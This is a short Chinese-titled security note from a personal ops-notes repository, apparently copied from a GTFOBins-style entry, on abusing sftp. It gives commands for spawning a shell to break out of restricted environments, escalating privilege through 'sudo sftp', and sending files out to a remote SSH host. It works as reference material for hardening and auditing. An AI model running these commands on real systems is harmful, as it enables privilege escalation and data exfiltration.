# sftp 提权

> GitHub 仓库源文件：[点击打开网页渲染版](https://github.com/ben2023niao/ben-ops-notes/blob/main/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%2B%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0-sftp%20%E6%8F%90%E6%9D%83.md)

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

- ```
HOST=[邮箱已脱敏]
sftp $HOST
!/bin/sh

```
## File upload

It can exfiltrate files on the network.

- Send local file to a SSH server.
```

RHOST=[邮箱已脱敏]
sftp $RHOST
put file_to_send file_to_save

```
## File download

It can download remote files.

- Fetch a remote file from a SSH server.
```

RHOST=[邮箱已脱敏]
sftp $RHOST
get file_to_get file_to_save

```
## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- ```
HOST=[邮箱已脱敏]
sudo sftp $HOST
!/bin/sh
```
